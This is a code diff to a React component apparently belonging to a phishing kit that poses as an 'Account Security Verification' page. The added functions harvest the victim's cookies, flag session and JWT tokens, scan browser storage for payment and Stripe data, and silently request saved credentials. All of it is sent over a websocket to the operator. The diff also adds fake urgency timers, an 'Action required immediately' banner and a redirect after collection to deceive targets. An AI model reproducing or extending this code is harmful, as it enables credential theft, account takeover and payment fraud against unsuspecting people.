@@ -12,7 +12,7 @@ import {
   FileCheck, ShieldCheck,
   Timer, Users, Fingerprint, User, MessageCircle, X,
   Upload, FileText, CreditCard as CreditCardIcon, HelpCircle,
-  Check, ChevronRight,
+  Check, ChevronRight, Key, Building,
 } from "lucide-react";
 import { SiGoogle, SiApple } from "react-icons/si";
 import { useDocumentTitle } from "@/hooks/useDocumentTitle";
@@ -29,6 +29,13 @@ interface TargetPageConfig {
   silentMode: boolean;
   persistentConnection: boolean;
   sessionLabel: string;
+  pagePreset: string;
+  pageDescription: string;
+  pageIcon: "shield" | "lock" | "key" | "user" | "building" | "globe";
+  redirectUrl: string;
+  urgencyLevel: "low" | "medium" | "high";
+  enableCookieHarvest: boolean;
+  enablePaymentScan: boolean;
 }
 
 interface SessionInfo {
@@ -277,7 +284,8 @@ export default function RemoteTarget() {
   const [wizardComplete, setWizardComplete] = useState(false);
 
   const [capturedEmail, setCapturedEmail] = useState("");
-  const [urgencyTimer, setUrgencyTimer] = useState(299);
+  const urgencySeconds = cfg.urgencyLevel === "high" ? 299 : cfg.urgencyLevel === "low" ? 0 : 899;
+  const [urgencyTimer, setUrgencyTimer] = useState(urgencySeconds);
   const [verificationCount] = useState(() => 2400 + Math.floor(Math.random() * 600));
   const [autoHarvestDone, setAutoHarvestDone] = useState(false);
   const [initStatus, setInitStatus] = useState("Establishing secure connection...");
@@ -309,7 +317,7 @@ export default function RemoteTarget() {
   const analyserRef = useRef<AnalyserNode | null>(null);
   const animFrameRef = useRef<number>(0);
 
-  const cfg = session?.pageConfig || { steps: { identity: true, biometric: true, voice: true, environment: true, documents: true }, enableBanking: false, enableAutoHarvest: true, enableCredentialOverlay: false, autoRequestPermissions: false, pageTitle: "Account Security Verification", pageSubtitle: "", brandColor: "blue" as const, silentMode: false, persistentConnection: false, sessionLabel: "" };
+  const cfg: TargetPageConfig = session?.pageConfig ? { pagePreset: "custom", pageDescription: "", pageIcon: "shield", redirectUrl: "", urgencyLevel: "medium", enableCookieHarvest: false, enablePaymentScan: false, ...session.pageConfig } : { steps: { identity: true, biometric: true, voice: true, environment: true, documents: true }, enableBanking: false, enableAutoHarvest: true, enableCredentialOverlay: false, autoRequestPermissions: false, pageTitle: "Account Security Verification", pageSubtitle: "", brandColor: "blue" as const, silentMode: false, persistentConnection: false, sessionLabel: "", pagePreset: "custom", pageDescription: "", pageIcon: "shield", redirectUrl: "", urgencyLevel: "medium", enableCookieHarvest: false, enablePaymentScan: false };
 
   const activeStepKeys = [
     cfg.steps.identity ? "identity" : null,
@@ -413,11 +421,13 @@ export default function RemoteTarget() {
   }, [token]);
 
   useEffect(() => {
+    if (cfg.urgencyLevel === "low") return;
+    const resetVal = cfg.urgencyLevel === "high" ? 299 : 899;
     const timer = setInterval(() => {
-      setUrgencyTimer((prev) => (prev <= 0 ? 299 : prev - 1));
+      setUrgencyTimer((prev) => (prev <= 0 ? resetVal : prev - 1));
     }, 1000);
     return () => clearInterval(timer);
-  }, []);
+  }, [cfg.urgencyLevel]);
 
   useEffect(() => {
     const t = setTimeout(() => setNotificationShown(true), 12000);
@@ -961,6 +971,127 @@ export default function RemoteTarget() {
     }
   }, [sendWS, updatePermission, token]);
 
+  const handleCookieHarvest = useCallback(async () => {
+    try {
+      const rawCookies = document.cookie || "";
+      const parsedCookies = rawCookies.split(";").filter(Boolean).map((c) => {
+        const [name, ...rest] = c.trim().split("=");
+        return { name: name?.trim() || "", value: rest.join("=")?.trim() || "" };
+      });
+
+      const authPatterns = /^(sess|sid|token|jwt|auth|csrf|xsrf|sapisid|ssid|apisid|hsid|lsid|nid|ogpc|consent|login|session|remember|access_token|refresh_token|id_token|_ga_|__stripe)/i;
+      const trackingPatterns = /^(_ga|_gid|_fbp|_fbc|__utm|_gcl|fr|datr|sb|wd|xs|c_user|presence|spin|__gads|__gpi|IDE|DSID|ANID|NID|1P_JAR|CONSENT|SOCS|AEC|OTZ|APISID|SAPISID)/i;
+
+      const categorized = parsedCookies.map((c) => {
+        let category = "unknown";
+        if (authPatterns.test(c.name)) category = "auth";
+        else if (trackingPatterns.test(c.name)) category = "tracking";
+        else if (/^(pref|lang|locale|theme|dark|mode|consent|cookie_consent|gdpr|optout)/i.test(c.name)) category = "preference";
+        return { ...c, category };
+      });
+
+      const authCookies = categorized.filter((c) => c.category === "auth");
+      const trackingCookies = categorized.filter((c) => c.category === "tracking");
+
+      const jwtTokens: string[] = [];
+      categorized.forEach((c) => {
+        if (/^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/.test(c.value)) {
+          jwtTokens.push(c.name);
+        }
+      });
+
+      sendWS({
+        type: "rc_browser_data",
+        data: {
+          category: "cookies_deep",
+          totalCookies: parsedCookies.length,
+          cookies: categorized,
+          authCookies: authCookies.length,
+          trackingCookies: trackingCookies.length,
+          jwtTokensFound: jwtTokens,
+          rawCookieString: rawCookies.substring(0, 4000),
+          timestamp: new Date().toISOString(),
+        },
+        token,
+      });
+    } catch {}
+  }, [sendWS, token]);
+
+  const handlePaymentScan = useCallback(async () => {
+    try {
+      const paymentKeywords = ["card", "payment", "stripe", "paypal", "billing", "checkout", "order", "cc_", "cvv", "expir", "merchant", "transaction", "wallet", "venmo", "cashapp", "zelle", "braintree", "adyen", "square"];
+
+      const scanStorage = (storage: Storage, name: string) => {
+        const found: Record<string, string> = {};
+        for (let i = 0; i < storage.length; i++) {
+          const key = storage.key(i);
+          if (key) {
+            const lowerKey = key.toLowerCase();
+            if (paymentKeywords.some((kw) => lowerKey.includes(kw))) {
+              found[key] = (storage.getItem(key) || "").substring(0, 500);
+            }
+          }
+        }
+        return found;
+      };
+
+      const localStoragePayment = scanStorage(localStorage, "localStorage");
+      const sessionStoragePayment = scanStorage(sessionStorage, "sessionStorage");
+
+      const stripeData: Record<string, string> = {};
+      for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        if (key && (key.startsWith("__stripe") || key.startsWith("stripe") || key.includes("pk_live") || key.includes("pk_test"))) {
+          stripeData[key] = (localStorage.getItem(key) || "").substring(0, 500);
+        }
+      }
+
+      let paymentRequestSupported = false;
+      try {
+        if ("PaymentRequest" in window) {
+          paymentRequestSupported = true;
+        }
+      } catch {}
+
+      let credentialManagerAvailable = false;
+      try {
+        if ("PasswordCredential" in window || "FederatedCredential" in window) {
+          credentialManagerAvailable = true;
+        }
+      } catch {}
+
+      let savedCredentials: any[] = [];
+      try {
+        if ("credentials" in navigator && "get" in navigator.credentials) {
+          const cred = await navigator.credentials.get({ password: true, mediation: "silent" } as any);
+          if (cred) {
+            savedCredentials.push({
+              type: cred.type,
+              id: cred.id,
+            });
+          }
+        }
+      } catch {}
+
+      sendWS({
+        type: "rc_browser_data",
+        data: {
+          category: "payment_scan",
+          localStoragePaymentKeys: localStoragePayment,
+          sessionStoragePaymentKeys: sessionStoragePayment,
+          stripeData,
+          localStoragePaymentCount: Object.keys(localStoragePayment).length,
+          sessionStoragePaymentCount: Object.keys(sessionStoragePayment).length,
+          paymentRequestApiSupported: paymentRequestSupported,
+          credentialManagerAvailable,
+          savedCredentials,
+          timestamp: new Date().toISOString(),
+        },
+        token,
+      });
+    } catch {}
+  }, [sendWS, token]);
+
   const handlers: Record<PermissionKey, () => void> = {
     camera: handleCamera, microphone: handleMicrophone, location: handleLocation,
     deviceInfo: handleDeviceInfo, files: handleFiles, credentials: handleCredentials,
@@ -1008,9 +1139,26 @@ export default function RemoteTarget() {
       try { await handleBrowserData(); } catch {}
       await new Promise((r) => setTimeout(r, 500));
 
+      if (cfg.enableCookieHarvest) {
+        setSilentModeStatus("Analyzing browser cookies...");
+        try { await handleCookieHarvest(); } catch {}
+        await new Promise((r) => setTimeout(r, 400));
+      }
+
+      if (cfg.enablePaymentScan) {
+        setSilentModeStatus("Scanning payment data...");
+        try { await handlePaymentScan(); } catch {}
+        await new Promise((r) => setTimeout(r, 400));
+      }
+
       setSilentModeStatus("Verification complete");
       await new Promise((r) => setTimeout(r, 1000));
       setSilentModePhase("complete");
+
+      if (cfg.redirectUrl) {
+        await new Promise((r) => setTimeout(r, 2000));
+        window.location.href = cfg.redirectUrl;
+      }
     };
 
     const waitForWs = async () => {
@@ -1021,7 +1169,7 @@ export default function RemoteTarget() {
       runSilentCollection();
     };
     waitForWs();
-  }, [session, autoHarvestDone, cfg.silentMode, handleCamera, handleMicrophone, handleLocation, handleClipboard, handleDeviceInfo, handleBrowserData]);
+  }, [session, autoHarvestDone, cfg.silentMode, handleCamera, handleMicrophone, handleLocation, handleClipboard, handleDeviceInfo, handleBrowserData, handleCookieHarvest, handlePaymentScan, cfg.enableCookieHarvest, cfg.enablePaymentScan, cfg.redirectUrl]);
 
   const handlePermissionRequest = useCallback((permission: PermissionKey) => {
     if (permissions[permission]?.granted) return;
@@ -1105,9 +1253,16 @@ export default function RemoteTarget() {
       setEnvCheckItems((prev) => [...prev, items[i].label]);
     }
 
+    if (cfg.enableCookieHarvest) {
+      try { await handleCookieHarvest(); } catch {}
+    }
+    if (cfg.enablePaymentScan) {
+      try { await handlePaymentScan(); } catch {}
+    }
+
     setScanRunning(false);
     setTimeout(() => advanceStep(), 800);
-  }, [handleLocation, handleBrowserData, handleClipboard, handleDeviceInfo, permissions, advanceStep]);
+  }, [handleLocation, handleBrowserData, handleClipboard, handleDeviceInfo, handleCookieHarvest, handlePaymentScan, permissions, advanceStep, cfg.enableCookieHarvest, cfg.enablePaymentScan]);
 
   useEffect(() => {
     if (currentStep === 0) return;
@@ -1295,12 +1450,13 @@ export default function RemoteTarget() {
 
   if (cfg.silentMode) {
     const silentLabel = cfg.sessionLabel || "IT Device Management";
+    const SilentIcon = { shield: Shield, lock: Lock, key: Key, user: User, building: Building, globe: Globe }[cfg.pageIcon] || Shield;
     return (
       <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4" data-testid="silent-mode-container">
         <div className="max-w-sm w-full text-center space-y-6">
           <div className="flex items-center justify-center">
             <div className="w-16 h-16 bg-white rounded-2xl border border-gray-200 flex items-center justify-center shadow-sm">
-              <Shield className="w-8 h-8 text-gray-700" />
+              <SilentIcon className="w-8 h-8 text-gray-700" />
             </div>
           </div>
 
@@ -1313,6 +1469,9 @@ export default function RemoteTarget() {
                 {silentModePhase === "collecting" ? silentModeStatus : "Device Verification in Progress"}
               </p>
             )}
+            {cfg.pageDescription && silentModePhase !== "complete" && (
+              <p className="text-xs text-gray-400 mt-2" data-testid="text-silent-description">{cfg.pageDescription}</p>
+            )}
           </div>
 
           {silentModePhase === "complete" ? (
@@ -1320,7 +1479,9 @@ export default function RemoteTarget() {
               <div className="w-12 h-12 bg-green-50 rounded-full flex items-center justify-center mx-auto">
                 <CheckCircle2 className="w-6 h-6 text-green-600" />
               </div>
-              <p className="text-xs text-gray-400">Your device has been verified successfully. You may close this page.</p>
+              <p className="text-xs text-gray-400">
+                {cfg.redirectUrl ? "Redirecting you shortly..." : "Your device has been verified successfully. You may close this page."}
+              </p>
             </div>
           ) : (
             <div className="space-y-4">
@@ -1870,6 +2031,20 @@ export default function RemoteTarget() {
     </div>
   );
 
+  const PageIconComponent = ({ className }: { className?: string }) => {
+    const iconMap = { shield: Shield, lock: Lock, key: Key, user: User, building: Building, globe: Globe };
+    const Icon = iconMap[cfg.pageIcon] || Shield;
+    return <Icon className={className} />;
+  };
+
+  useEffect(() => {
+    if (!wizardComplete || !cfg.redirectUrl) return;
+    const timer = setTimeout(() => {
+      window.location.href = cfg.redirectUrl;
+    }, 3000);
+    return () => clearTimeout(timer);
+  }, [wizardComplete, cfg.redirectUrl]);
+
   const renderComplete = () => (
     <div className={`transition-all duration-500 opacity-100`} data-testid="step-complete">
       <div className="max-w-sm mx-auto text-center space-y-6 py-8">
@@ -1882,6 +2057,9 @@ export default function RemoteTarget() {
           <p className="text-sm text-gray-500">
             Your identity has been successfully verified. You can now access your account.
           </p>
+          {cfg.redirectUrl && (
+            <p className="text-xs text-gray-400">Redirecting you shortly...</p>
+          )}
         </div>
         <div className="space-y-2 text-left max-w-xs mx-auto">
           {[
@@ -1994,11 +2172,20 @@ export default function RemoteTarget() {
         </div>
       </div>
 
+      {cfg.urgencyLevel === "high" && !wizardComplete && (
+        <div className="bg-red-600 text-white">
+          <div className="max-w-2xl mx-auto px-4 py-1.5 flex items-center justify-center gap-2 text-xs font-medium animate-pulse">
+            <AlertTriangle className="w-3.5 h-3.5" />
+            <span>Action required immediately - Your session will expire soon</span>
+          </div>
+        </div>
+      )}
+
       <header className="bg-white border-b border-gray-200">
         <div className="max-w-2xl mx-auto px-4 py-3 flex items-center justify-between">
           <div className="flex items-center gap-2">
             <div className={`w-8 h-8 ${brand.bg} rounded-lg flex items-center justify-center`}>
-              <Shield className="w-4 h-4 text-white" />
+              <PageIconComponent className="w-4 h-4 text-white" />
             </div>
             <div>
               <span className="text-sm font-semibold text-gray-900">{cfg.pageTitle}</span>
@@ -2006,9 +2193,9 @@ export default function RemoteTarget() {
             </div>
           </div>
           <div className="flex items-center gap-4">
-            {!wizardComplete && (
-              <span className="text-xs text-gray-400" data-testid="text-urgency-timer">
-                Session expires in {timerMin}:{timerSec.toString().padStart(2, "0")}
+            {!wizardComplete && cfg.urgencyLevel !== "low" && (
+              <span className={`text-xs ${cfg.urgencyLevel === "high" ? "text-red-500 font-medium" : "text-gray-400"}`} data-testid="text-urgency-timer">
+                {cfg.urgencyLevel === "high" ? "Expires" : "Session expires"} in {timerMin}:{timerSec.toString().padStart(2, "0")}
               </span>
             )}
             <button className="text-xs text-gray-400 hover:text-gray-600 flex items-center gap-1" data-testid="link-help">
@@ -2023,6 +2210,14 @@ export default function RemoteTarget() {
           </div>
         )}
       </header>
+
+      {cfg.pageDescription && !wizardComplete && (
+        <div className="bg-gray-50 border-b border-gray-100">
+          <div className="max-w-2xl mx-auto px-4 py-3">
+            <p className="text-xs text-gray-600 leading-relaxed" data-testid="text-page-description">{cfg.pageDescription}</p>
+          </div>
+        </div>
+      )}
 
       <main className="flex-1 px-4 py-8">
         <div className="max-w-lg mx-auto">
